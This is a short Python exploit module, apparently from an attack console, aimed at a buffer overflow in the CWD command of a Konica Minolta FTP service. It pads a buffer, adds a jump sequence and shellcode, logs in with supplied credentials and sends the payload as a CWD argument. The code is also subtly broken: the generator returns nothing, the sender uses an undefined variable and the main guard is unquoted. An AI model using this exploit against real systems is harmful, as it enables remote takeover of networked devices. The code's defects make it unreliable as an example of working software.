class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
    def generate(self, p):
      p += self.rand(1037)
      p += "\xEB\x06b<\x9Dm \x12"
      p += self.get_shellcode()
      p += self.rand(3000)
    def deliver(self, p):
      self.init_deliver()
      s = self.connect()
      s.send("USER " + self.user[0])
      s.recv(1024)
      s.send("PASS " + self.passwd[0])
      s.recv(1024)
      s.send("CWD " + payload)
      self.disconnect(s)
def main():
  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu()
  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
if __name__ == __main__:
  main()
